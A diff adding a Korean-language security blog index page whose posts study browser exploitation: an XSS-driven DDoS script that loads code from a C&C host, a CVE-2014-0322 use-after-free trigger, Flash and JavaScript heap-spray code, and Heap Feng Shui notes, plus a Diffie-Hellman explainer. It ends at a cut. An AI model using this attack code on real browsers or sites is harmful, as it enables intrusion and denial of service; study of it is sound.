@@ -1,0 +1,1052 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>My Octopress Blog</title>
+  <meta name="author" content="Your Name">
+
+  
+  <meta name="description" content="The mechanism behind Internet Explorer CVE-2014-1776 exploits Matt Oh 의 CVE-2014-1776 분석. Flash 가 heap spraying 을 수행하고, JavaScript function 을 호출한다. &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://yoursite.com/posts/14/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="My Octopress Blog" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">My Octopress Blog</a></h1>
+  
+    <h2>A blogging framework for hackers.</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="sitesearch" value="yoursite.com">
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div class="blog-index">
+  
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2014/05/17/cve-2014-1776/">CVE-2014-1776</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-05-17T09:11:24+09:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>17</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>9:11 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p><a href="http://h30499.www3.hp.com/t5/HP-Security-Research-Blog/The-mechanism-behind-Internet-Explorer-CVE-2014-1776-exploits/ba-p/6476220">The mechanism behind Internet Explorer CVE-2014-1776 exploits</a></p>
+
+<p>Matt Oh 의 CVE-2014-1776 분석.</p>
+
+<p>Flash 가 heap spraying 을 수행하고, JavaScript function 을 호출한다. DOM emulator + V8 honeypot 으로는 놓칠 수 밖에 없다.</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2014/05/14/ddos-using-a-persistent-xss/">DDoS Using a Persistent XSS</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-05-14T11:48:16+09:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>14</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>11:48 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p><a href="http://thehackernews.com/2014/04/vulnerability-in-worlds-largest-site.html">Vulnerability in World Largest Video Site Turned Million of Visitors into DDoS Zombies</a></p>
+
+<pre><code>// JS injection in &lt;img&gt; tag enabled by Persistent XSS
+&lt;img src="/imagename.jpg" onload="$.getScript('http://c&amp;cdomain.com/inject-iframe.html')&gt;
+
+// inject-iframe.html
+// Malicious JS opens hidden &lt;iframe&gt;
+$("body").append("&lt;iframe id='ifr11323' style='display:none;' src='http://c&amp;cdomain.com/ddos.html'&gt;&lt;/iframe&gt;");
+
+// ddos.html
+// Ajax DDoS script
+&lt;html&gt;&lt;body&gt;
+&lt;h1&gt;iframe&lt;/h1&gt;
+&lt;script&gt;
+ddos('http://www.target1.com');
+function ddos(url) {
+    window.setInterval( function() { $.getScript(url); }, 1000);
+}
+&lt;/script&gt;
+&lt;/body&gt;&lt;/html&gt;
+</code></pre>
+
+<p>사람들의 방문이 많은 사이트에 자바스크립트를 업로드할 수 있다면, 방문자의 브라우저를 DDoS 좀비로 만들 수 있다.</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2014/05/10/cve-2014-0322-snowman-exploit/">CVE-2014-0322 'Snowman' Exploit</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-05-10T01:12:08+09:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>10</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>1:12 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p><a href="http://hdwsec.fr/blog/CVE-2014-0322.html">CVE-2014-0322 &lsquo;Snowman&rsquo; exploit</a></p>
+
+<p>crash 를 유발하는 JS.</p>
+
+<pre><code>&lt;script&gt;
+    function dword2data(dword) {
+        var d = Number(dword).toString(16);
+        while (d.length &lt; 8)
+            d = '0' + d;
+        return unescape('%u' + d.substr(4, 8) + '%u' + d.substr(0, 4));
+    }
+
+
+    var g_arr = [];
+    var arrLen = 0x250;
+
+    function fun() {
+
+        var a = 0;
+        for (a = 0; a &lt; arrLen; ++a) {
+            g_arr[a] = document.createElement('div')
+        }
+
+        var b = dword2data(0xdeadc0de);
+        var c = 0x1a1b2000;
+        while (b.length &lt; 0x360) {
+            b += dword2data(0x1a1b2000)
+        }
+
+        var d = b.substring(0, (0x340 - 2) / 2);
+        try {
+            this.outerHTML = this.outerHTML
+        } catch (e) {}
+
+        CollectGarbage();
+
+        for (a = 0; a &lt; arrLen; ++a) {
+            g_arr[a].title = d.substring(0, d.length);
+        }
+    }
+
+    function puIHa3() {
+        var a = document.getElementsByTagName("script");
+        var b = a[0];
+        b.onpropertychange = fun;
+        var e = document.createElement('SELECT');
+        e = b.appendChild(e);
+    }
+
+    puIHa3();
+&lt;/script&gt;
+</code></pre>
+
+<p>Flash 에서 heap 을 할당하고, initialize 하고, <code>ExternalInterface.call()</code> 로 JavaScript function 을 호출한다. JavaScript function 에서는 use-after-free 를 발생시킨다. Flash timer handler 에서 할당된 heap 을 모니터하며 corruption 이 발생했는지를 주기적으로 감시한다. corrupt condition 이 발견되면 VirtualProtect 와 stack pivot 정보를 찾아 DEP / ASLR 을 바이패스하는 payload 를 만들어 수행시킨다.</p>
+
+<h3>Heap Spraying</h3>
+
+<pre><code>&lt;Object&gt; 를 96 * 1024 (0x18180 == 98688) 개 할당한다.
+각각 s[0] ~ s[0x18180 - 1] 마다 Vector.&lt;uint&gt;(1024 - 16) 를 할당하고, 
+
+public function init_heap():void
+{
+    var len:int = 0;
+    var i:int = 0;
+
+    /* Spray the integer vectors */
+    this.s = new Vector.&lt;Object&gt;(0x18180);
+    whlie (len &lt; 0x18180)
+    {
+        this.s[len] = new Vector.&lt;uint&gt;(0x1000 / 4 - 16);
+        for (i = 0; i &lt; this.s[len].length; i++)
+        {
+            this.s[len][i] = 0x1a1a1a1a;
+        }
+        ++len;
+    }
+
+    /* Spray sound object ptr */
+    this.sound = new Sound();
+    this.spraysound = new Vector.&lt;Object&gt;(0x100);
+
+    len = 0;
+    while (len &lt; 0x100)
+    {
+        this.spraysound[len] = new Vector.&lt;Object&gt;(0x1234);
+        for (i = 0; i &lt; this.spraysound[len].length; i++)
+        {
+            this.spraysound[len][i] = this.sound;
+        }
+        ++len;
+    }
+}
+</code></pre>
+
+<h3>JavaScript use-after-free</h3>
+
+<h3>DEP bypass</h3>
+
+<pre><code>BOOL WINAPI VirtualProtect(
+    LPVOID lpAddress,
+    SIZE_T dwSize,
+    DWORD flNewProtect,
+    PDWORD lpflOldProtect
+);
+
+BOOL WINAPI VirtualProtectEx(
+    HANDLE hProcess,
+    LPVOID lpAddress,
+    SIZE_T dwSize,
+    DWORD flNewProtect,
+    PDWORD lpflOldProtect
+);
+
+lpAddress [in]
+보호 특성을 변경할 가상 메모리의 기준 주소에 대한 포인터입니다.
+
+dwSize [in]
+변경할 메모리 페이지 영역의 크기(바이트)입니다.
+
+flNewProtect [in]
+적용할 메모리 보호 형식입니다.
+
+pflOldProtect [out]
+이전 메모리 보호 값에 대한 포인터입니다.
+</code></pre>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2014/05/09/the-diffie-hellman-protocol/">The Diffie Hellman Protocol</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-05-09T19:54:33+09:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>9</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>7:54 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>큰 소수 p 를 정한다. (e.g. 600 digits -> approx. 2000 bits)</p>
+
+<p>{1,&hellip;,p} 중에서 정수 하나를 고른다. g.</p>
+
+<ol>
+<li>Alice : choose random a in {1,&hellip;,p-1}</li>
+<li>send A = g<sup>a</sup> (mod p) to Bob</li>
+<li>Bob: choose random b in {1,&hellip;,p-1}</li>
+<li>send B = g<sup>b</sup> (mod p) to Alice</li>
+<li>Shared key = g<sup>ab</sup> (mod p)</li>
+</ol>
+
+
+<p>Eavesdropper sees: p,g, A = g<sup>a</sup> (mod p), and B = g<sup>b</sup> (mod p)</p>
+
+<p>저 정보를 가지고 g<sup>ab</sup> (mod p) 를 계산할 수 있을까?</p>
+
+<p>Physical 한 예를 들어본다.</p>
+
+<p>e.g. 열쇠를 공유하지 않고 상자의 내용물을 안전하게 지키면서 deliver 하고 싶다.</p>
+
+<ol>
+<li>Alice 는 상자에 자신의 열쇠로 잠궈서 Bob 에게 보낸다.</li>
+<li>상자를 받은 Bob 역시 자신의 열쇠로 잠궈서 Alice 에서 다시 보낸다.</li>
+<li>Alice 는 상자를 잠근 두 개의 Lock 중에서 자신이 잠근 Lock 을 자신의 열쇠로 풀어서, 다시 Bob 에게 보낸다.</li>
+<li>Bob 은 상자를 잠근 자신의 Lock 을 푼다.</li>
+</ol>
+
+
+<p>중간에 상자를 가로채더라도 Eavesdropper 는 상자의 Lock 을 해제할 수 없다.</p>
+
+<p>수학적으로 열쇠를 채우는 연산은 exp + mod prime 연산인데, 이게 왜 계산이 어려운지 설명해보겠다.</p>
+
+<p>예를 들어 32478543<sup>743921429837645</sup> 의 remainder 를 찾는 문제를 생각해보자.</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2014/05/02/heap-feng-shui-in-javascript/">Heap Feng Shui in JavaScript</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-05-02T15:15:17+09:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>2</span><span class='date-suffix'>nd</span>, <span class='date-year'>2014</span></span> <span class='time'>3:15 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Sotirov 의 오래된 발표를 recap 해본다. 적지 않은 내용들이 outdated 되었지만, 가치가 있다.</p>
+
+<ul>
+<li><a href="https://www.blackhat.com/presentations/bh-europe-07/Sotirov/Presentation/bh-eu-07-sotirov-apr19.pdf">Heap Feng Shui in JavaScript</a></li>
+<li><a href="https://www.blackhat.com/presentations/bh-europe-07/Sotirov/Whitepaper/bh-eu-07-sotirov-WP.pdf">Heap Feng Shui in JavaScript</a></li>
+<li><a href="http://www.phreedom.org/research/heap-feng-shui/heap-feng-shui.html">Heap Feng Shui in JavaScript</a></li>
+</ul>
+
+
+<p>Sotirov 의 발표를 내멋대로 번역해본다.</p>
+
+<h3>Blazde &amp; SkyLined (2004)</h3>
+
+<p>200MB 의 heap 을 spray 하는 코드.</p>
+
+<pre><code>var nop = unescape("%u9090%u9090");
+
+// Create a 1MB of NOP instruction followed by shellcode
+// malloc header    string length   NOP slide   shellcode   NULL terminator
+// 32 bytes         4 bytes         x bytes     y bytes     2 bytes
+
+while (nop.length &lt;= 0x100000/2) nop += nop;
+
+nop = nop.substring(0, 0x100000 - 32/2 - 4/2 - shellcode.length - 2/2);
+
+var x = new Array();
+for (var i=0; i&lt;200; i++)
+    x[i] = nop + shellcode;
+</code></pre>
+
+<p>일단 1 MB (1024 * 1024 bytes) 이상의 string 을 만들고, <code>substring()</code> 통해서 system heap 에 alloc 한다.
+unicode 라서 VirtualAlloc() chunk header 가 32 bytes. JavaScript 이 string 헤더가 4 bytes. NULL terminator 가 2 bytes.
+substring() 의 단위가 unicode 라서 &lsquo;나누기 2&rsquo; 를 해준다.
+<code>new Array()</code> 에 반복해서 assign 해줌으로서 system heap 에 200 MB 를 alloc 한다.
+JavaScript object 는 JavaScript heap 에 alloc 되고 JavaScript string 은 default process heap 에 alloc 된다.</p>
+
+<p>이제 windbg 를 통해서 이 spray 된 스트링들이 메모리 0x00000000 ~ 0x7fffffff 어디에 뿌려졌는지 찾아야 한다.
+그리고, Browser 의 C++ object vtable 등을 오염시킬때 어떤 값으로 오염시켜야 저 영역으로 튀어나갈지 테스트해야 한다.</p>
+
+<ol>
+<li>만약 다음과 같이 virtual function 을 호출하는 코드가 있다고 하자.</li>
+<li>그리고 우리는 브라우저의 C++ object 를 어떻게든 overwrite 할 수 있다고 하자.</li>
+<li>그리고 메모리의 특정 영역대를 JavaScript 을 통한 heap spray 로 write 할 수 있다고 하자.</li>
+</ol>
+
+
+<p>Virtual function 을 호출하는 코드 샘플이다.</p>
+
+<pre><code>mov ecx, dword ptr [eax]    ; get the vtable address
+push eax                    ; pass c++ this pointer as the first argument
+call dword ptr [ecx+08h]    ; call the function at offset 0x8 in the vtable
+</code></pre>
+
+<p>C++ object 의 첫 4 바이트는 vtable 을 가리키는 pointer 이다.
+C++ object 의 처음 4 byte 를 0x0c0c0c0c 으로 overwrite 할 수 있다고 하자.
+그리고 0x0c0c0c0c 영역을 heap spray 로 뿌려둘 수가 있다고 하자.
+C++ object 의 ctable pointer 를 0x0c0c0c0c 로 overwrite 했고,
+0x0c0c0c0c 에 있는 fake vtable 도 offset +0 부터 0x0c0c0c0c 으로 overwrite 했다.</p>
+
+<p><code>eax</code> 가 0x0c0c0c0c 이었고, <code>mov ecx, dword ptr [eax]</code> 의 결과로 <code>ecx</code> 도 0x0c0c0c0c 이 되고,
+<code>call dword ptr [ecx+08h]</code> 도 0x0c0c0c0c 을 호출하게 된다. 0x0c0c 는 <code>or al,0ch</code> 로 NOP-like instruction.
+결국 EIP 는 0x0c0c0c0c 로 세팅되고, NOP-slide 를 따라 쭉 미끄러진다음에 shellcode 를 수행하게 된다.</p>
+
+<h3>Heap Feng Shui (2007)</h3>
+
+<ul>
+<li>The heap allocator is deterministic.</li>
+<li>Specific sequences of allocations and frees can be used to control the layout.</li>
+<li>We want to set the heap state before triggering a vulnerability.</li>
+<li>Heap spraying proves that JavaScript can access the system heap.</li>
+<li>We need a way to allocate and free blocks of an arbitrary size.</li>
+<li>JavaScript <code>string</code> objects use default process heap.</li>
+</ul>
+
+
+<h4>String Allocation</h4>
+
+<p><code>OLEAUT32.DLL</code> 의 <code>SysAllocString()</code> 이 담당.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="kd">var</span> <span class="nx">str1</span> <span class="o">=</span> <span class="s2">&quot;AAAAAAAAAAAAAAAAAAAA&quot;</span><span class="p">;</span> <span class="c1">// doesn&#39;t allocate a new string</span>
+</span><span class='line'><span class="kd">var</span> <span class="nx">str2</span> <span class="o">=</span> <span class="nx">str1</span><span class="p">.</span><span class="nx">substr</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span> <span class="c1">// allocates a new 10 character string</span>
+</span><span class='line'><span class="kd">var</span> <span class="nx">str3</span> <span class="o">=</span> <span class="nx">str1</span> <span class="o">+</span> <span class="nx">str2</span><span class="p">;</span> <span class="c1">// allocates a new 30 character string</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>BSTR 에서는 <code>len = (bytes-6)/2</code> 이기때문에, 다음과 같은 코드가 성립.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="c1">// Build a long string with padding data</span>
+</span><span class='line'>
+</span><span class='line'><span class="nx">data</span> <span class="o">=</span> <span class="s1">&#39;AAAA&#39;</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">while</span> <span class="p">(</span><span class="nx">padding</span><span class="p">.</span><span class="nx">length</span> <span class="o">&lt;</span> <span class="nx">MAX_ALLOCATION_LENGTH</span><span class="p">)</span>
+</span><span class='line'>    <span class="nx">padding</span> <span class="o">=</span> <span class="nx">padding</span> <span class="o">+</span> <span class="nx">padding</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1">// Allocate a memory block of a specified size in bytes</span>
+</span><span class='line'>
+</span><span class='line'><span class="kd">function</span> <span class="nx">alloc</span><span class="p">(</span><span class="nx">bytes</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>    <span class="k">return</span> <span class="nx">padding</span><span class="p">.</span><span class="nx">substr</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="nx">bytes</span><span class="o">-</span><span class="mi">6</span><span class="p">)</span><span class="o">/</span><span class="mi">2</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h4>Garbage Collection</h4>
+
+<p><code>OLEAUT32.DLL</code> 의 <code>SysFreeString</code> 이 담당.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="kd">var</span> <span class="nx">str</span><span class="p">;</span> <span class="c1">// We need to do the allocation and free in a function scope, otherwise the garbage collector will not free the string.</span>
+</span><span class='line'>
+</span><span class='line'><span class="kd">function</span> <span class="nx">alloc_str</span><span class="p">(</span><span class="nx">bytes</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>    <span class="nx">str</span> <span class="o">=</span> <span class="nx">padding</span><span class="p">.</span><span class="nx">substr</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="nx">bytes</span><span class="o">-</span><span class="mi">6</span><span class="p">)</span><span class="o">/</span><span class="mi">2</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="kd">function</span> <span class="nx">free_str</span><span class="p">()</span> <span class="p">{</span>
+</span><span class='line'>    <span class="nx">str</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
+</span><span class='line'>    <span class="nx">CollectGarbage</span><span class="p">();</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="nx">alloc_str</span><span class="p">(</span><span class="mh">0x10000</span><span class="p">);</span> <span class="c1">// allocate memory block</span>
+</span><span class='line'><span class="nx">free_str</span><span class="p">();</span> <span class="c1">// free memory block</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h4>OLEAUT32 memory allocator</h4>
+
+<p>문제는, SysAllocStr() 이 caching 을 해서, 항상 시스템 힙에서 새로운 memory allocation 이 일어나는 것은 아니란 것.</p>
+
+<p>Cache 는 다음과 같이 구성된다. 4 개의 bin 이 있고, 각각 6 개의 블락을 홀딩할 수 있다. bin 은 사이즈로 나뉜다.</p>
+
+<p><code>APP_DATA::AllocCachedMem()</code> 와 <code>APP_DATA::FreeCachedMem()</code> 의 reverse 된 소스는 다음과 같다.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="c1">// Each entry in the cache has a size and a pointer to the free block</span>
+</span><span class='line'>
+</span><span class='line'><span class="nx">struct</span> <span class="nx">CacheEntry</span> <span class="p">{</span>
+</span><span class='line'>    <span class="nx">unsigned</span> <span class="kr">int</span> <span class="nx">size</span><span class="p">;</span>
+</span><span class='line'>    <span class="k">void</span> <span class="o">*</span> <span class="nx">ptr</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1">// The cache consists of 4 bins, each holding 6 blocks of a certain size range</span>
+</span><span class='line'>
+</span><span class='line'><span class="kr">class</span> <span class="nx">APP_DATA</span> <span class="p">{</span>
+</span><span class='line'>    <span class="nx">CacheEntry</span> <span class="nx">bin_1_32</span><span class="p">[</span><span class="mi">6</span><span class="p">];</span> <span class="c1">// blocks from 1 to 32 bytes</span>
+</span><span class='line'>    <span class="nx">CacheEntry</span> <span class="nx">bin_33_64</span><span class="p">[</span><span class="mi">6</span><span class="p">];</span>
+</span><span class='line'>    <span class="nx">CacheEntry</span> <span class="nx">bin_65_256</span><span class="p">[</span><span class="mi">6</span><span class="p">];</span>
+</span><span class='line'>    <span class="nx">CacheEntry</span> <span class="nx">bin_257_32768</span><span class="p">[</span><span class="mi">6</span><span class="p">];</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="k">void</span> <span class="o">*</span> <span class="nx">AllocCachedMem</span><span class="p">(</span><span class="nx">unsigned</span> <span class="kr">long</span> <span class="nx">size</span><span class="p">);</span> <span class="c1">// alloc function</span>
+</span><span class='line'>    <span class="k">void</span> <span class="nx">FreeCachedMem</span><span class="p">(</span><span class="k">void</span> <span class="o">*</span> <span class="nx">ptr</span><span class="p">);</span> <span class="c1">// free function</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1">//</span>
+</span><span class='line'><span class="c1">// Allocate memory, reusing the blocks from the cache</span>
+</span><span class='line'><span class="c1">//</span>
+</span><span class='line'><span class="k">void</span> <span class="o">*</span> <span class="nx">APP_DATA</span><span class="o">::</span><span class="nx">AllocCachedMem</span><span class="p">(</span><span class="nx">unsigned</span> <span class="kr">long</span> <span class="nx">size</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>    <span class="nx">CacheEntry</span> <span class="o">*</span> <span class="nx">bin</span><span class="p">;</span>
+</span><span class='line'>    <span class="kr">int</span> <span class="nx">i</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="nx">g_fDebNoCache</span> <span class="o">==</span> <span class="nx">TRUE</span><span class="p">)</span>
+</span><span class='line'>        <span class="kr">goto</span> <span class="nx">system_alloc</span><span class="p">;</span> <span class="c1">// Use HeapAlloc if caching is disabled</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="c1">// Find the right cache bin for the block size</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="nx">size</span> <span class="o">&gt;</span> <span class="mi">256</span><span class="p">)</span>
+</span><span class='line'>        <span class="nx">bin</span> <span class="o">=</span> <span class="o">&amp;</span><span class="k">this</span><span class="o">-&gt;</span><span class="nx">bin_257_32768</span><span class="p">;</span>
+</span><span class='line'>    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">size</span> <span class="o">&gt;</span> <span class="mi">64</span><span class="p">)</span>
+</span><span class='line'>        <span class="nx">bin</span> <span class="o">=</span> <span class="o">&amp;</span><span class="k">this</span><span class="o">-&gt;</span><span class="nx">bin_65_256</span><span class="p">;</span>
+</span><span class='line'>    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">size</span> <span class="o">&gt;</span> <span class="mi">32</span><span class="p">)</span>
+</span><span class='line'>        <span class="nx">bin</span> <span class="o">=</span> <span class="o">&amp;</span><span class="k">this</span><span class="o">-&gt;</span><span class="nx">bin_33_64</span><span class="p">;</span>
+</span><span class='line'>    <span class="k">else</span>
+</span><span class='line'>        <span class="nx">bin</span> <span class="o">=</span> <span class="o">&amp;</span><span class="k">this</span><span class="o">-&gt;</span><span class="nx">bin_1_32</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="c1">// Iterate through all entries in the bin</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="k">for</span> <span class="p">(</span><span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">6</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="c1">// If the cached block is big enough, use it for this allocation</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="k">if</span> <span class="p">(</span><span class="nx">bin</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">size</span> <span class="o">&gt;=</span> <span class="nx">size</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>            <span class="nx">bin</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">size</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">// size 0 means the cache entry is unused</span>
+</span><span class='line'>            <span class="k">return</span> <span class="nx">bin</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">ptr</span><span class="p">;</span>
+</span><span class='line'>        <span class="p">}</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="nx">system_alloc</span><span class="o">:</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="c1">// Allocate memory using the system memory allocator</span>
+</span><span class='line'>    <span class="k">return</span> <span class="nx">HeapAlloc</span><span class="p">(</span><span class="nx">GetProcessHeap</span><span class="p">(),</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">size</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>APP_DATA memory allocator 가 사용하는 caching algorithm 이 방해가 되는 상황. Plunger 테크닉으로 극복.</p>
+
+<h4>Plunger technique</h4>
+
